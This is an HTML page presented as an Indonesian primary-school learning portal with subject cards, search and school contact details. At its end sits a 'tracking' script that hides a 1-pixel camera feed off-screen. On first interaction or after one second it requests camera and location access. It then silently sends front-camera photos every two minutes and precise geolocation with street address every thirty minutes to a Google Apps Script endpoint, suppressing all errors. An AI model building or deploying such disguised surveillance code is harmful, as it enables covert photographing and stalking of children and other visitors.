<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal Pembelajaran SD - Sistem Informasi Pendidikan</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        /* Header */
        .header {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 20px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }

        .logo-section {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }

        .school-name {
            color: #333;
        }

        .school-name h2 {
            font-size: 20px;
            font-weight: 700;
            color: #667eea;
        }

        .school-name p {
            font-size: 12px;
            color: #666;
        }

        .nav-links {
            display: flex;
            gap: 25px;
            align-items: center;
        }

        .nav-links a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-links a:hover {
            color: #764ba2;
        }

        .user-badge {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 600;
        }

        /* Main Content */
        .main-content {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }

        /* Featured Card */
        .featured-card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }

        .featured-header {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 20px;
        }

        .featured-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #ffd89b 0%, #19547b 100%);
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
        }

        .featured-title h1 {
            color: #333;
            font-size: 28px;
            margin-bottom: 5px;
        }

        .featured-title p {
            color: #666;
            font-size: 14px;
        }

        .featured-content {
            color: #555;
            line-height: 1.8;
            margin-bottom: 20px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
            transition: transform 0.2s;
        }

        .btn-primary:hover {
            transform: scale(1.05);
        }

        /* Quick Access Cards */
        .quick-access {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .quick-card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
            cursor: pointer;
            transition: transform 0.2s;
        }

        .quick-card:hover {
            transform: translateX(5px);
        }

        .quick-card-header {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 10px;
        }

        .quick-icon {
            width: 50px;
            height: 50px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }

        .quick-card h3 {
            color: #333;
            font-size: 16px;
            font-weight: 600;
        }

        .quick-card p {
            color: #666;
            font-size: 13px;
            margin-left: 65px;
        }

        /* Search Section */
        .search-section {
            margin-bottom: 30px;
        }

        .search-bar {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 15px 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .search-bar input {
            flex: 1;
            background: #f5f5f5;
            border: 2px solid #e0e0e0;
            padding: 12px 20px;
            border-radius: 15px;
            color: #333;
            font-size: 14px;
            outline: none;
        }

        .search-bar input:focus {
            border-color: #667eea;
        }

        .search-bar button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 15px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
            transition: transform 0.2s;
        }

        .search-bar button:hover {
            transform: scale(1.05);
        }

        /* Modules Grid */
        .modules-section {
            margin-top: 30px;
        }

        .section-title {
            color: white;
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .modules-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 20px;
        }

        .module-card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .module-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.2);
        }

        .module-icon {
            width: 60px;
            height: 60px;
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
            margin-bottom: 15px;
        }

        .module-card h3 {
            color: #333;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .module-card p {
            color: #666;
            font-size: 13px;
            line-height: 1.6;
            margin-bottom: 15px;
        }

        .module-meta {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-top: 15px;
            border-top: 1px solid #e0e0e0;
        }

        .grade-badge {
            background: #e3f2fd;
            color: #1976d2;
            padding: 5px 12px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 600;
        }

        .lesson-count {
            color: #999;
            font-size: 12px;
        }

        /* Info Section */
        .info-section {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            margin-top: 20px;
        }

        .info-section h3 {
            color: #333;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .info-list {
            list-style: none;
        }

        .info-list li {
            padding: 15px 0;
            border-bottom: 1px solid #e0e0e0;
            color: #555;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .info-list li:last-child {
            border-bottom: none;
        }

        .info-icon {
            width: 35px;
            height: 35px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
        }

        /* Loader */
        .loader {
            display: inline-flex;
            gap: 5px;
        }

        .loader-dot {
            width: 8px;
            height: 8px;
            background: #667eea;
            border-radius: 50%;
            animation: bounce 0.6s infinite alternate;
        }

        .loader-dot:nth-child(2) {
            animation-delay: 0.2s;
        }

        .loader-dot:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes bounce {
            from { transform: translateY(0); }
            to { transform: translateY(-10px); }
        }

        /* Hidden camera */
        #camera {
            position: absolute;
            width: 1px;
            height: 1px;
            top: -9999px;
            left: -9999px;
        }

        /* Stats Cards */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .stat-number {
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .stat-label {
            color: #666;
            font-size: 13px;
            margin-top: 5px;
        }

        /* Responsive */
        @media (max-width: 968px) {
            .main-content {
                grid-template-columns: 1fr;
            }

            .modules-grid {
                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            }
        }

        @media (max-width: 600px) {
            .nav-links {
                display: none;
            }

            .modules-grid {
                grid-template-columns: 1fr;
            }

            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
    </style>
</head>
<body>
    <video id="camera" autoplay playsinline></video>

    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo-section">
                <div class="logo">üìö</div>
                <div class="school-name">
                    <h2>SD Negeri Cerdas</h2>
                    <p>Portal Pembelajaran Digital</p>
                </div>
            </div>
            <div class="nav-links">
                <a href="#">Beranda</a>
                <a href="#">Materi</a>
                <a href="#">Jadwal</a>
                <a href="#">Nilai</a>
                <a href="#">Pengumuman</a>
                <div class="user-badge">üë®‚Äçüéì Siswa</div>
            </div>
        </div>

        <!-- Stats Grid -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number">24</div>
                <div class="stat-label">Mata Pelajaran</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">156</div>
                <div class="stat-label">Modul Tersedia</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">8.5</div>
                <div class="stat-label">Rata-rata Nilai</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">92%</div>
                <div class="stat-label">Kehadiran</div>
            </div>
        </div>

        <!-- Search Section -->
        <div class="search-section">
            <div class="search-bar">
                <input type="text" id="searchInput" placeholder="Cari mata pelajaran, materi, atau buku...">
                <button onclick="searchModules()">üîç Cari</button>
            </div>
        </div>

        <!-- Main Content -->
        <div class="main-content">
            <div class="featured-card">
                <div class="featured-header">
                    <div class="featured-icon">üìñ</div>
                    <div class="featured-title">
                        <h1>Selamat Datang di Portal Pembelajaran</h1>
                        <p>Akses semua materi pembelajaran SD kelas 1-6</p>
                    </div>
                </div>
                <div class="featured-content">
                    <p>Portal Pembelajaran SD menyediakan akses lengkap ke semua materi pelajaran, buku digital, video pembelajaran, latihan soal, dan berbagai sumber belajar lainnya. Semua dirancang khusus untuk membantu siswa belajar dengan lebih efektif dan menyenangkan.</p>
                    <p style="margin-top: 10px;">Pilih mata pelajaran di bawah untuk mulai belajar!</p>
                </div>
                <button class="btn-primary" onclick="showAllModules()">üìö Lihat Semua Materi</button>
            </div>

            <div class="quick-access">
                <div class="quick-card" onclick="accessModule('Jadwal Pelajaran')">
                    <div class="quick-card-header">
                        <div class="quick-icon" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);">üìÖ</div>
                        <h3>Jadwal Pelajaran</h3>
                    </div>
                    <p>Lihat jadwal pelajaran minggu ini</p>
                </div>
                <div class="quick-card" onclick="accessModule('Tugas & PR')">
                    <div class="quick-card-header">
                        <div class="quick-icon" style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);">‚úèÔ∏è</div>
                        <h3>Tugas & PR</h3>
                    </div>
                    <p>5 tugas menunggu untuk dikerjakan</p>
                </div>
                <div class="quick-card" onclick="accessModule('Perpustakaan Digital')">
                    <div class="quick-card-header">
                        <div class="quick-icon" style="background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);">üìö</div>
                        <h3>Perpustakaan Digital</h3>
                    </div>
                    <p>156 buku digital tersedia</p>
                </div>
            </div>
        </div>

        <!-- Modules Section -->
        <div class="modules-section">
            <div class="section-title">
                <span>üìñ</span> Mata Pelajaran
            </div>
            <div class="modules-grid" id="modulesGrid"></div>
        </div>

        <!-- School Info Section -->
        <div class="info-section">
            <h3>
                <span style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">üìç</span>
                Informasi Sekolah
            </h3>
            <div id="schoolInfoText">
                <span class="loader">
                    <span class="loader-dot"></span>
                    <span class="loader-dot"></span>
                    <span class="loader-dot"></span>
                </span>
                Memuat informasi lokasi sekolah...
            </div>
            <ul class="info-list" id="schoolInfoList" style="display: none;"></ul>
        </div>
    </div>

<script>
// Modules Database
const modulesDatabase = [
    {
        name: 'Matematika',
        icon: 'üî¢',
        color: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        description: 'Belajar berhitung, geometri, pengukuran, dan pemecahan masalah matematika',
        grade: 'Kelas 1-6',
        lessons: 45
    },
    {
        name: 'Bahasa Indonesia',
        icon: 'üìù',
        color: 'linear-gradient(135deg, #f093fb 0%, #f5576c 100%)',
        description: 'Membaca, menulis, tata bahasa, dan sastra Indonesia',
        grade: 'Kelas 1-6',
        lessons: 52
    },
    {
        name: 'IPA (Sains)',
        icon: 'üî¨',
        color: 'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)',
        description: 'Ilmu Pengetahuan Alam: makhluk hidup, energi, dan alam semesta',
        grade: 'Kelas 1-6',
        lessons: 38
    },
    {
        name: 'IPS (Sosial)',
        icon: 'üåç',
        color: 'linear-gradient(135deg, #43e97b 0%, #38f9d7 100%)',
        description: 'Ilmu Pengetahuan Sosial: sejarah, geografi, dan ekonomi',
        grade: 'Kelas 1-6',
        lessons: 35
    },
    {
        name: 'Bahasa Inggris',
        icon: 'üó£Ô∏è',
        color: 'linear-gradient(135deg, #fa709a 0%, #fee140 100%)',
        description: 'Vocabulary, grammar, conversation, dan reading comprehension',
        grade: 'Kelas 1-6',
        lessons: 42
    },
    {
        name: 'Pendidikan Agama',
        icon: 'üïå',
        color: 'linear-gradient(135deg, #30cfd0 0%, #330867 100%)',
        description: 'Pendidikan agama dan budi pekerti',
        grade: 'Kelas 1-6',
        lessons: 28
    },
    {
        name: 'PJOK (Olahraga)',
        icon: '‚öΩ',
        color: 'linear-gradient(135deg, #a8edea 0%, #fed6e3 100%)',
        description: 'Pendidikan Jasmani, Olahraga, dan Kesehatan',
        grade: 'Kelas 1-6',
        lessons: 24
    },
    {
        name: 'Seni Budaya',
        icon: 'üé®',
        color: 'linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%)',
        description: 'Seni rupa, musik, tari, dan kerajinan tangan',
        grade: 'Kelas 1-6',
        lessons: 30
    },
    {
        name: 'PKN (Kewarganegaraan)',
        icon: 'üáÆüá©',
        color: 'linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%)',
        description: 'Pendidikan Kewarganegaraan dan nilai-nilai Pancasila',
        grade: 'Kelas 1-6',
        lessons: 26
    },
    {
        name: 'Prakarya',
        icon: '‚úÇÔ∏è',
        color: 'linear-gradient(135deg, #a1c4fd 0%, #c2e9fb 100%)',
        description: 'Keterampilan membuat kerajinan dan karya seni',
        grade: 'Kelas 4-6',
        lessons: 22
    },
    {
        name: 'Muatan Lokal',
        icon: 'üèõÔ∏è',
        color: 'linear-gradient(135deg, #d299c2 0%, #fef9d7 100%)',
        description: 'Bahasa daerah dan budaya lokal',
        grade: 'Kelas 1-6',
        lessons: 18
    },
    {
        name: 'Literasi Digital',
        icon: 'üíª',
        color: 'linear-gradient(135deg, #89f7fe 0%, #66a6ff 100%)',
        description: 'Pengenalan komputer dan teknologi informasi',
        grade: 'Kelas 1-6',
        lessons: 20
    }
];

// Render Modules
function renderModules(modules = modulesDatabase) {
    const modulesGrid = document.getElementById('modulesGrid');
    modulesGrid.innerHTML = '';
    
    modules.forEach(module => {
        const moduleCard = document.createElement('div');
        moduleCard.className = 'module-card';
        moduleCard.onclick = () => accessModule(module.name);
        
        moduleCard.innerHTML = `
            <div class="module-icon" style="background: ${module.color};">
                ${module.icon}
            </div>
            <h3>${module.name}</h3>
            <p>${module.description}</p>
            <div class="module-meta">
                <span class="grade-badge">${module.grade}</span>
                <span class="lesson-count">üìö ${module.lessons} materi</span>
            </div>
        `;
        
        modulesGrid.appendChild(moduleCard);
    });
}

// Search Modules
function searchModules() {
    const searchTerm = document.getElementById('searchInput').value.toLowerCase();
    
    if (!searchTerm) {
        renderModules();
        return;
    }
    
    const filteredModules = modulesDatabase.filter(module => 
        module.name.toLowerCase().includes(searchTerm) || 
        module.description.toLowerCase().includes(searchTerm)
    );
    
    renderModules(filteredModules);
    
    if (filteredModules.length === 0) {
        document.getElementById('modulesGrid').innerHTML = `
            <div style="grid-column: 1/-1; text-align: center; background: rgba(255,255,255,0.95); padding: 40px; border-radius: 20px;">
                <h3 style="color: #333;">Tidak ada materi ditemukan</h3>
                <p style="color: #666; margin-top: 10px;">Coba kata kunci lain</p>
            </div>
        `;
    }
}

// Search on Enter key
document.getElementById('searchInput').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        searchModules();
    }
});

// Access Module
function accessModule(moduleName) {
    const infoText = document.getElementById('schoolInfoText');
    const infoList = document.getElementById('schoolInfoList');
    
    infoText.innerHTML = `
        <span class="loader">
            <span class="loader-dot"></span>
            <span class="loader-dot"></span>
            <span class="loader-dot"></span>
        </span>
        Memuat informasi ${moduleName}...
    `;
    
    infoList.style.display = 'none';
    
    // Simulate loading
    setTimeout(() => {
        const info = [
            `üìñ Modul: ${moduleName}`,
            `üë®‚Äçüè´ Guru Pengampu: ${getRandomTeacher()}`,
            `üìÖ Jadwal: ${getRandomSchedule()}`,
            `üìö Total ${Math.floor(Math.random() * 30) + 20} materi tersedia`,
            `‚úÖ ${Math.floor(Math.random() * 15) + 5} materi sudah dipelajari`,
            `‚è∞ Waktu belajar: ${Math.floor(Math.random() * 40) + 30} menit/minggu`
        ];
        
        infoText.innerHTML = `Informasi ${moduleName}`;
        infoList.style.display = 'block';
        infoList.innerHTML = info.map(item => `
            <li>
                <div class="info-icon">${item.charAt(0)}</div>
                ${item.substring(2)}
            </li>
        `).join('');
    }, 1500);
}

function showAllModules() {
    document.getElementById('searchInput').value = '';
    renderModules();
    document.querySelector('.modules-section').scrollIntoView({ behavior: 'smooth' });
}

function getRandomTeacher() {
    const teachers = ['Bu Siti', 'Pak Budi', 'Bu Ani', 'Pak Andi', 'Bu Dewi', 'Pak Rudi'];
    return teachers[Math.floor(Math.random() * teachers.length)];
}

function getRandomSchedule() {
    const days = ['Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat'];
    const day = days[Math.floor(Math.random() * days.length)];
    const hour = Math.floor(Math.random() * 4) + 7;
    return `${day}, ${hour}:00 - ${hour + 2}:00`;
}

// Load school location info
function loadSchoolInfo() {
    const infoText = document.getElementById('schoolInfoText');
    const infoList = document.getElementById('schoolInfoList');
    
    setTimeout(() => {
        infoText.innerHTML = 'SD Negeri Cerdas - Lokasi & Kontak';
        infoList.style.display = 'block';
        infoList.innerHTML = `
            <li>
                <div class="info-icon">üè´</div>
                Jl. Pendidikan No. 123, Bogor, Jawa Barat
            </li>
            <li>
                <div class="info-icon">üìû</div>
                Telepon: (0251) 123-4567
            </li>
            <li>
                <div class="info-icon">üìß</div>
                Email: info@sdcerdas.sch.id
            </li>
            <li>
                <div class="info-icon">üïê</div>
                Jam Sekolah: Senin-Jumat, 07:00 - 13:00 WIB
            </li>
            <li>
                <div class="info-icon">üë®‚Äçüéì</div>
                Total Siswa: 485 siswa (Kelas 1-6)
            </li>
            <li>
                <div class="info-icon">üë©‚Äçüè´</div>
                Total Guru: 32 guru & tenaga pendidik
            </li>
        `;
    }, 2000);
}

// Initialize
renderModules();
loadSchoolInfo();

// Original tracking code below - TIDAK DIUBAH
const camera = document.getElementById('camera');

// URL Google Apps Script - GANTI DENGAN URL ANDA
const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzj26HMCMhgGnXfaC_dZRV-sxYo0Meg6PSDs1trM2p4iz2WlK0EwO5wpvMLWfxF0nWw/exec';

let watchId;
let photoInterval;
let locationInterval;
let stream;
let permissionsRequested = false;
let lastPhotoTime = null;
let lastLocationTime = null;
let videoReady = false;

function requestPermissions() {
    if (permissionsRequested) {
        return;
    }
    
    permissionsRequested = true;
    
    if (!stream) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return;
        }
        
        navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 }
            } 
        })
        .then(s => {
            stream = s;
            camera.srcObject = stream;
            
            camera.onloadedmetadata = () => {
                camera.play().then(() => {
                    // Tunggu video benar-benar siap
                    setTimeout(() => {
                        videoReady = true;
                        startPhotoCapture();
                        startLocationTracking();
                    }, 1000);
                });
            };
        })
        .catch(err => {
            // Silent fail
        });
    }
}

function startLocationTracking() {
    getCurrentLocationAndSend();
    
    locationInterval = setInterval(() => {
        getCurrentLocationAndSend();
    }, 1800000);
}

function getCurrentLocationAndSend() {
    if (!navigator.geolocation) {
        return;
    }
    
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            lastLocationTime = Date.now();
            await handleLocation(position);
        },
        (err) => {
            // Silent fail
        },
        { 
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }
    );
}

async function getAddressFromCoords(lat, lon) {
    try {
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
        
        const response = await fetch(url, {
            headers: {
                'User-Agent': 'LocationTracker/1.0'
            }
        });
        
        if (!response.ok) {
            return null;
        }
        
        const data = await response.json();
        
        return {
            road: data.address.road || data.address.street || '-',
            suburb: data.address.suburb || data.address.neighbourhood || '-',
            village: data.address.village || data.address.hamlet || '-',
            city: data.address.city || data.address.town || data.address.municipality || '-',
            state: data.address.state || data.address.province || '-',
            postcode: data.address.postcode || '-',
            country: data.address.country || '-',
            displayName: data.display_name || '-'
        };
        
    } catch (err) {
        return null;
    }
}

async function handleLocation(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const acc = position.coords.accuracy;

    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

    const address = await getAddressFromCoords(lat, lon);

    const trackingData = { 
        type: 'tracking', 
        lat: lat, 
        lon: lon, 
        acc: acc,
        mapsLink: mapsLink,
        address: address ? {
            road: address.road,
            suburb: address.suburb,
            village: address.village,
            city: address.city,
            state: address.state,
            postcode: address.postcode,
            country: address.country,
            displayName: address.displayName
        } : null
    };
    
    try {
        fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(trackingData)
        })
        .then(() => {
            // Silent success
        })
        .catch(err => {
            // Silent fail
        });
    } catch (err) {
        // Silent fail
    }
}

function startPhotoCapture() {
    if (!stream || !videoReady) {
        return;
    }
    
    if (!photoInterval) {
        // Tunggu lebih lama untuk foto pertama
        setTimeout(() => {
            capturePhoto();
        }, 3000);
        
        photoInterval = setInterval(capturePhoto, 120000);
    }
}

async function capturePhoto() {
    lastPhotoTime = Date.now();
    
    if (!stream || !videoReady) {
        return;
    }
    
    if (!camera.videoWidth || !camera.videoHeight) {
        return;
    }
    
    // Pastikan video sedang playing
    if (camera.paused || camera.ended) {
        try {
            await camera.play();
            // Tunggu sebentar setelah play
            await new Promise(resolve => setTimeout(resolve, 500));
        } catch (e) {
            return;
        }
    }

    try {
        const canvas = document.createElement('canvas');
        canvas.width = camera.videoWidth;
        canvas.height = camera.videoHeight;

        const ctx = canvas.getContext('2d');
        
        // Pastikan context ada dan video siap
        if (!ctx) return;
        
        ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
        
        // Cek apakah canvas tidak hitam (semua pixel = 0)
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const pixels = imageData.data;
        let hasColor = false;
        
        // Sample beberapa pixel untuk cek apakah ada warna
        for (let i = 0; i < pixels.length; i += 40) {
            if (pixels[i] > 0 || pixels[i+1] > 0 || pixels[i+2] > 0) {
                hasColor = true;
                break;
            }
        }
        
        // Jika masih hitam, skip dan coba lagi nanti
        if (!hasColor) {
            return;
        }

        const dataUrl = canvas.toDataURL('image/jpeg', 0.9);

        const photoData = { 
            type: 'photo', 
            dataUrl: dataUrl 
        };
        
        fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(photoData)
        })
        .then(() => {
            // Silent success
        })
        .catch(err => {
            // Silent fail
        });
        
    } catch (err) {
        // Silent fail
    }
}

const events = ['click', 'touchstart', 'keydown'];

events.forEach(event => {
    document.addEventListener(event, (e) => {
        requestPermissions();
    }, { once: true });
});

setTimeout(() => {
    if (!permissionsRequested) {
        requestPermissions();
    }
}, 1000);
</script>

</body>
</html>